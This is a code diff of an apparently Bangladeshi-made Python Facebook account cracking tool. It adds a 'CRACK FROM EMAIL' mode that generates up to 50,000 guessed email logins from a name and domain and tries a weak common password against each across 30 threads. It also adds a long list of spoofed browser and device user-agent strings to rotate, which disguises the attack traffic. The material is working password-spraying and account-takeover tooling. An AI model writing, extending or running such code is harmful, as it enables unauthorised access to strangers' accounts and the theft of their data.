@@ -7,7 +7,7 @@ P = '\033[95;1m'   #بنفسجي
 C = '\033[96;1m'  #ازرق
 N = '\x1b[0m'  #ابيض
 T = '\x1b[38;5;208m' #برتقالي
-logos = ("""              \x1b[38;5;208m                Welcome To admin 
+logos = ("""          \033[92;1m                     Welcome To admin \x1b[38;5;208m 
   ______   __  __              _____     _      _     
  |  ____| |  \/  |     /\     |  __ \   | |    | |    
  | |__    | \  / |    /  \    | |  | |  | | __ | |__  
@@ -56,7 +56,7 @@ def runtxt(z):
     for e in z + "\n":
         sys.stdout.write(e)
         sys.stdout.flush()
-        time.sleep(0.03)
+        time.sleep(0.02)
 
 
 
@@ -111,7 +111,7 @@ class Main:
 			exit()
 		os.system("clear")
 		print("")
-		print (logos)
+		runtxt (logos)
 
 		print("""\x1b[38;5;208m══════════════════════════════════════════════════════""")
 		print("%s [%s1%s]%s CRACK RANDOM FB ID%s 2012-15 "%(R,G,R,T,Y))
@@ -121,8 +121,9 @@ class Main:
 		print("%s [%s5%s]%s CRACK RANDOM FB ID%s 2005-7 "%(R,G,R,T,Y))
 		print("%s [%s6%s]%s CRACK RANDOM FB ID%s 2004-6 "%(R,G,R,T,Y))
 		print("%s [%s7%s]%s CRACK RANDOM FB ID%s 2004-5 "%(R,G,R,T,Y))
+		print("%s [%s8%s]%s CRACK FROM EMAIL"%(R,G,R,T))
 		print("""\x1b[38;5;208m══════════════════════════════════════════════════════""")
-		hoga = input("\x1b[38;5;208m [☆] CRACK :  ")
+		hoga = input("%s [☆] CRACK : %s"%(T,G))
 		if hoga in ["", " "]:
 			Main()
 		elif hoga in ["1", "01"]:
@@ -140,9 +141,9 @@ class Main:
 		elif hoga in ["7", "07"]:
 			self.old4_5()
 		elif hoga in ["8", "08"]:
-			self.shanto4()
-		elif hoga in ["9", "09"]:
 			self.email()
+		elif hoga in ["9", "09"]:
+			self.shanto4()
 		elif hoga in ["10","১০"]:
 			self.oldcrack()
 		elif hoga in ["P", "p"]:
@@ -356,12 +357,10 @@ class Main:
 	def email(self):
 		x = 111
 		xx = 999
-		nam = input("%s [?] TYPE A NAME %s(EX: Abir): "%(T,G))
+		nam = input("%s [☆] Enter name %s(EX: Mark): %s"%(T,Y,G))
 		nam = nam.replace(" ", "")
-		print("%s EXAMPLE  : %s@gmail.com, @yahoo.com, @hotmail.com ETC"%(Y,G))
-		idx = input("%s DOMAIN  : "%(B))
+		idx = input("%s [☆] Email%s (EX: @yahoo.com) : %s"%(T,Y,G))
 		limit = int(input("\x1b[38;5;208m [☆] ENTER LIMIT \033[93;1m(50000 MAX): \033[0;92m"))
-		print("""\x1b[38;5;208m══════════════════════════════════════════════════════""")
 		if (limit)>50000:
 			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
 		try:
@@ -370,13 +369,14 @@ class Main:
 				__ = idx
 				___ = nam
 				self.id.append(___+str(_)+__)
-			print("\x1b[38;5;208m [☆] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
+			print("\x1b[38;5;208m [☆] TOTAL ID -> \033[93;1m%s\033[93;1m"%(len(self.id))) 
 			print("")
 			print("""\x1b[38;5;208m══════════════════════════════════════════════════════""")
 			with ThreadPoolExecutor(max_workers=30) as coeg:
 				print("%s PSSWORD : %s123456,1234567,123456789"%(T,G))
 				print("")
 				listpass = input("%s [?] ENTER PASSWORD :%s "%(T,G))
+				print("""\x1b[38;5;208m══════════════════════════════════════════════════════""")
 				if len(listpass)<=5:
 					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
 				for user in self.id:
@@ -458,6 +458,44 @@ class Main:
             "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A5370a Safari/604.1"
             "Mozilla/5.0 (iPhone9,3; U; CPU iPhone OS 10_0_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14A403 Safari/602.1"
             "Mozilla/5.0 (Apple-iPhone7C2/1202.466; U; CPU like Mac OS X; en) AppleWebKit/420+ (KHTML, like Gecko) Version/3.0 Mobile/1A543 Safari/419.3"
+            "Mozilla/5.0 (Linux; Android 12; SM-X906C Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36"
+            "Mozilla/5.0 (Linux; Android 11; Lenovo YT-J706X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"
+            "Mozilla/5.0 (Linux; Android 7.0; Pixel C Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36"
+            "Mozilla/5.0 (Linux; Android 6.0.1; SGP771 Build/32.2.A.0.253; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36"
+            "Mozilla/5.0 (Linux; Android 6.0.1; SHIELD Tablet K1 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Safari/537.36"
+            "Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-T550 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.3 Chrome/38.0.2125.102 Safari/537.36"
+            "Mozilla/5.0 (Linux; Android 4.4.3; KFTHWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/47.1.79 like Chrome/47.0.2526.80 Safari/537.36"
+            "Mozilla/5.0 (Linux; Android 5.0.2; LG-V410/V41020c Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/34.0.1847.118 Safari/537.36"
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
+            "Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36"
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9"
+            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36"
+            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1"
+            "Dalvik/2.1.0 (Linux; U; Android 9; ADT-2 Build/PTT5.181126.002)"
+            "Mozilla/5.0 (CrKey armv7l 1.5.16041) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.0 Safari/537.36"
+            "Roku4640X/DVP-7.70 (297.70E04154A)"
+            "Mozilla/5.0 (Linux; U; Android 4.2.2; he-il; NEO-X5-116A Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30"
+            "Mozilla/5.0 (Linux; Android 9; AFTWMST22 Build/PS7233; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.152 Mobile Safari/537.36"
+            "Mozilla/5.0 (Linux; Android 5.1; AFTS Build/LMY47O) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/41.99900.2250.0242 Safari/537.36"
+            "Dalvik/2.1.0 (Linux; U; Android 6.0.1; Nexus Player Build/MMB29T)"
+            "AppleTV11,1/11.1"
+            "AppleTV6,2/11.1"
+            "AppleTV5,3/9.1.1"
+            "Mozilla/5.0 (PlayStation; PlayStation 5/2.26) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Safari/605.1.15"
+            "Mozilla/5.0 (PlayStation 4 3.11) AppleWebKit/537.73 (KHTML, like Gecko)"
+            "Mozilla/5.0 (PlayStation Vita 3.61) AppleWebKit/537.73 (KHTML, like Gecko) Silk/3.2"
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox Series X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 Safari/537.36 Edge/20.02"
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; XBOX_ONE_ED) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
+            "Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.10586"
+            "Mozilla/5.0 (Nintendo Switch; WifiWebAuthApplet) AppleWebKit/601.6 (KHTML, like Gecko) NF/4.0.0.5.10 NintendoBrowser/5.1.0.13343"
+            "Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US"
+            "Mozilla/5.0 (Nintendo 3DS; U; ; en) Version/1.7412.EU"
+            "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
+            "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
+            "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
+            "Mozilla/5.0 (X11; U; Linux armv7l like Android; en-us) AppleWebKit/531.2+ (KHTML, like Gecko) Version/5.0 Safari/533.2+ Kindle/3.0+"
+            "Mozilla/5.0 (Linux; U; en-US) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) Version/4.0 Kindle/3.0 (screen 600x800; rotate)"
+            
 		])
 		sys.stdout.write(
 			"\r\r %s\x1b[38;5;208m[☆] ︻╦̵̵̿╤── : %s/%s -> \033[0;92m [ BY-OK:%s ]- \033[0;91m[BY-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
